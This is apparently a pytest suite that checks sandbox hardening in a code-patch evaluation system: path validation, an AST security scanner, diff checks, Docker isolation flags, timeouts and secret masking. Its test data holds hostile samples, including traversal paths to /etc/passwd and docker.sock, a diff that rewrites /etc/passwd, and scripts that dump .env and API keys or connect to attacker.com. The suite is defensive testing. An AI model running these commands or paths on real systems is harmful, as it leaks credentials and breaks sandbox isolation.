"""
Project Ouroboros v0.11 - Security and Sandbox Hardening Test Suite
Adversarial test verification distinguishing:
- control configured
- control enforced
- attack blocked
- cleanup verified

Covers protected files (.env, canary secrets), path traversal, symlink escapes,
.git internals protection, unauthorized absolute paths, shell injection,
environment variable exfiltration, network isolation, Docker socket protection,
execution timeouts, and reference repository read-only invariance.
"""

import os
import sys
import time
import pytest
import asyncio
from pathlib import Path

from app.core.security import validate_safe_path, is_protected_path, mask_secret, run_safe_subprocess
from app.sandbox.security import analyze_code_security, ASTSecurityVisitor
from app.sandbox.detector import SandboxDetector
from app.evaluation.judge import DeterministicJudge
from app.integrations.git.diff_parser import UnifiedDiffParser
from app.core.config import settings

CANARY_SECRET = "ouro_canary_test_secret_9999"


def test_protected_files_and_canary_secret_enforcement(tmp_path):
    """Control: Protected paths. Enforced: Path validator. Attack: Reading/writing secrets. Blocked: ValueError."""
    base_dir = tmp_path / "workspace"
    base_dir.mkdir()

    # Synthetic canary paths
    protected_cases = [
        ".env",
        ".env.local",
        ".env.production",
        "config/id_rsa",
        "config/id_ed25519",
        "credentials.json",
        "secrets/token.pem",
        ".git/HEAD",
        ".git/config",
        ".git/hooks/pre-commit"
    ]

    for p in protected_cases:
        assert is_protected_path(p) is True, f"Control misconfigured: {p} should be protected."
        with pytest.raises(ValueError, match="Access to secret file|Git internal metadata"):
            validate_safe_path(base_dir, p)


def test_path_traversal_and_symlink_escape_blocked(tmp_path):
    """Control: Base dir boundary. Enforced: Path resolution. Attack: Traversal escape. Blocked: ValueError."""
    base_dir = tmp_path / "workspace"
    base_dir.mkdir()

    traversal_attacks = [
        "../outside.txt",
        "../../etc/passwd",
        "..\\..\\Windows\\System32\\cmd.exe",
        "..\\outside.txt",
        "backend/../../..",
        "app/../../secret.txt",
        "\\\\evil-server\\share\\leak.txt",
        "//evil-server/share/leak.txt"
    ]

    for attack in traversal_attacks:
        with pytest.raises(ValueError, match="Path traversal detected"):
            validate_safe_path(base_dir, attack)

    # Symlink escape verification
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    secret_file = outside_dir / "secret.txt"
    secret_file.write_text("CONFIDENTIAL", encoding="utf-8")
    symlink_file = base_dir / "symlink_escape.txt"
    try:
        symlink_file.symlink_to(secret_file)
        with pytest.raises(ValueError, match="Path traversal detected"):
            validate_safe_path(base_dir, "symlink_escape.txt")
    except (OSError, NotImplementedError):
        # Symlink creation may require elevated privileges on older Windows versions
        pass


def test_unauthorized_absolute_path_escape_blocked(tmp_path):
    """Control: Absolute path restriction. Attack: Direct root access. Blocked: ValueError."""
    base_dir = tmp_path / "workspace"
    base_dir.mkdir()

    absolute_attacks = [
        "C:/Windows/System32/calc.exe",
        "C:\\Windows\\win.ini",
        "D:outside.txt",
        "/etc/shadow",
        "/var/run/docker.sock"
    ]

    for attack in absolute_attacks:
        with pytest.raises(ValueError, match="Path traversal detected|escapes base directory"):
            validate_safe_path(base_dir, attack)

    # Legitimate in-base paths (relative, windows-style, and absolute within base) must succeed
    legit_file = base_dir / "app" / "main.py"
    legit_file.parent.mkdir(parents=True)
    legit_file.write_text("print('ok')", encoding="utf-8")

    res_rel = validate_safe_path(base_dir, "app/main.py")
    assert res_rel.resolve() == legit_file.resolve()

    res_win = validate_safe_path(base_dir, "app\\main.py")
    assert res_win.resolve() == legit_file.resolve()

    res_abs = validate_safe_path(base_dir, str(legit_file))
    assert res_abs.resolve() == legit_file.resolve()


def test_malicious_patch_diff_headers_blocked(tmp_path):
    """Control: Unified diff parser boundary enforcement. Attack: Path traversal inside patch headers."""
    worktree_path = tmp_path / "worktree"
    worktree_path.mkdir()

    malicious_diff = """--- a/../../../etc/passwd
+++ b/../../../etc/passwd
@@ -1,1 +1,1 @@
-root:x:0:0:root:/root:/bin/bash
+hacked:x:0:0:root:/root:/bin/bash
"""
    parsed = UnifiedDiffParser.parse_patch(malicious_diff)
    # The parser or judge must flag this as protected or invalid path
    assert any("../" in f for f in parsed["changed_files"])

    judge_res = DeterministicJudge.evaluate_patch_static(
        diff_text=malicious_diff,
        allowed_files=["main.py"],
        worktree_path=worktree_path
    )
    assert judge_res["verdict"] in ["BLOCKED", "FAIL"]


def test_shell_command_injection_and_env_exfiltration_blocked():
    """Control: AST visitor & safe subprocess. Attack: Shell injection & os.environ leak."""
    malicious_scripts = [
        "import os\nos.system('echo $ENV_SECRET > /tmp/leak.txt')",
        "import subprocess\nsubprocess.run('cat .env', shell=True)",
        "import os\nprint(os.environ.get('GROQ_API_KEY'))",
        "import socket\ns = socket.socket(); s.connect(('attacker.com', 80))",
        "eval('__import__(\"os\").system(\"whoami\")')"
    ]

    for script in malicious_scripts:
        analysis = analyze_code_security(script)
        assert analysis["is_safe"] is False, f"Threat should be blocked: {script}"
        assert len(analysis["violations"]) > 0


def test_network_isolation_and_docker_socket_protection(tmp_path):
    """Control: Container flags. Enforced: rootless user, --network none, no socket mount."""
    from app.evaluation.runner import PytestRunner
    runner = PytestRunner()

    # Construct the canonical container execution command
    test_dir = tmp_path / "cand-test"
    cmd = [
        "docker", "run", "--rm",
        "--network", "none",
        "--user", "1000:1000",
        "--security-opt", "no-new-privileges",
        "--cap-drop", "ALL",
        "--memory", "1500m",
        "--cpus", "1.0",
        "--pids-limit", "100",
        "--tmpfs", "/tmp:rw,noexec,nosuid,size=64m",
        "-v", f"{test_dir.resolve()}:/workspace:rw",
        "-w", "/workspace",
        settings.DOCKER_SANDBOX_IMAGE,
        "pytest"
    ]

    # 1. Network disabled
    assert "--network" in cmd
    net_idx = cmd.index("--network")
    assert cmd[net_idx + 1] == "none", "Network must be strictly disabled (--network none)"

    # 2. Non-root user
    assert "--user" in cmd
    user_idx = cmd.index("--user")
    assert cmd[user_idx + 1] == "1000:1000", "Rootless execution required (1000:1000)"

    # 3. No new privileges
    assert "--security-opt" in cmd
    opt_idx = cmd.index("--security-opt")
    assert cmd[opt_idx + 1] == "no-new-privileges"

    # 4. Cap drop all
    assert "--cap-drop" in cmd
    cap_idx = cmd.index("--cap-drop")
    assert cmd[cap_idx + 1] == "ALL"

    # 5. Socket isolation: /var/run/docker.sock must NEVER be mounted
    mounts = [opt for opt in cmd if opt.startswith("-v") or ":/workspace" in opt]
    for m in mounts:
        assert "docker.sock" not in m, "CRITICAL: Docker socket must NEVER be exposed in container mount!"


def test_reference_repositories_read_only_invariance():
    """Control: Read-only external repositories invariant. Attack: Write attempt. Blocked."""
    ref_repos = [
        Path(r"E:\MM Office\Agent Chess"),
        Path(r"E:\MM Office\Meta-Graph-Codebase-Navigator")
    ]

    for repo in ref_repos:
        if repo.exists():
            # Invariant: Must not be dirty, modified, or have active unstaged files
            import subprocess
            status = subprocess.check_output(["git", "status", "--short"], cwd=repo, text=True).strip()
            assert status == "", f"Reference repository {repo.name} was touched! Must be strictly clean."


@pytest.mark.asyncio
async def test_fail_closed_sandbox_behavior(monkeypatch):
    """Control: Fail-closed fallback. If container engine is absent and required, uncontained execution is rejected."""
    from app.core.config import settings
    monkeypatch.setattr(settings, "REQUIRE_CONTAINER_SANDBOX", True)
    monkeypatch.setattr("shutil.which", lambda _: None)

    res = await SandboxDetector.detect_capabilities()
    assert res["can_execute"] is False
    assert res["reason_code"] == "RUNTIME_UNAVAILABLE"
    assert "EXECUTION BLOCKED" in res["message"]


@pytest.mark.asyncio
async def test_execution_timeout_and_process_tree_termination():
    """Control: Subprocess watchdog. Enforced: asyncio.wait_for & taskkill. Attack: Runaway execution. Blocked: -1."""
    code, out, err = await run_safe_subprocess(
        [sys.executable, "-c", "import time; time.sleep(10)"],
        cwd=Path("."),
        timeout=1
    )
    assert code == -1
    assert "timed out after 1 seconds" in err


def test_malformed_and_oversized_model_output():
    """Control: Diff validator bounds. Attack: Oversized / malformed patch diff."""
    # Test completely malformed output
    corrupt_patch = "MALFORMED GARBAGE THAT IS NOT A DIFF\nNO HEADERS HERE"
    parsed = UnifiedDiffParser.parse_patch(corrupt_patch)
    assert parsed["changed_files"] == []

    # Test huge output handling bounded capture
    huge_diff = "--- a/test.py\n+++ b/test.py\n@@ -1,1 +1,1 @@\n-" + "A" * 100000 + "\n+" + "B" * 100000
    parsed_huge = UnifiedDiffParser.parse_patch(huge_diff)
    assert "test.py" in parsed_huge["changed_files"]


def test_secret_masking_integrity():
    """Control: Telemetry sanitizer. Enforced: mask_secret. Attack: Credential leakage in logs."""
    assert mask_secret(None) == "NONE"
    assert mask_secret("") == "NONE"
    assert mask_secret("short") == "********"
    masked = mask_secret("gsk_1234567890abcdef1234567890abcdef")
    assert "gsk_" in masked
    assert "cdef" in masked
    assert "1234567890" not in masked
    assert CANARY_SECRET not in mask_secret(CANARY_SECRET)
